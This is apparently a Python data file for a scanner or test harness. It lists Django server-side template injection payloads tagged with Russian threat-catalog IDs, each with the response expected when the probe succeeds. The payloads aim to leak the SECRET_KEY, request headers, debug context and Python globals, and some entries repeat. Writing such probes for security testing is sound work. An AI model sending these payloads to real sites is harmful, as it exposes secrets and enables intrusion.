ubi_payloads = [
    {
        "ubi": "УБИ.2",
        "payload": "{% debug %}",
        "expected": "Context",
        "engine": "Django"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ settings.SECRET_KEY }}",
        "expected": None,
        "engine": "Django"
    },
    {
        "ubi": "УБИ.5",
        "payload": "{{ request.META }}",
        "expected": "HTTP_",
        "engine": "Django"
    },
    {
        "ubi": "УБИ.8",
        "payload": "{{ request.resolver_match }}",
        "expected": "ResolverMatch",
        "engine": "Django"
    },
    {
        "ubi": "УБИ.2",
        "payload": "{% debug %}",
        "expected": "Context",
        "engine": "Django"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ view.__class__.__init__.__globals__ }}",
        "expected": None,
        "engine": "Django"
    },
    {
        "ubi": "УБИ.5",
        "payload": "{{ request.META.HTTP_USER_AGENT }}",
        "expected": "Mozilla",  # подставляется заголовком
        "engine": "Django"
    },
    {
        "ubi": "УБИ.10",
        "payload": "{{ request.__class__.__base__ }}",
        "expected": "HttpRequest",
        "engine": "Django"
    },
    {
        "ubi": "УБИ.8",
        "payload": "{{ request.resolver_match.url_name }}",
        "expected": "index",
        "engine": "Django"
    }
]
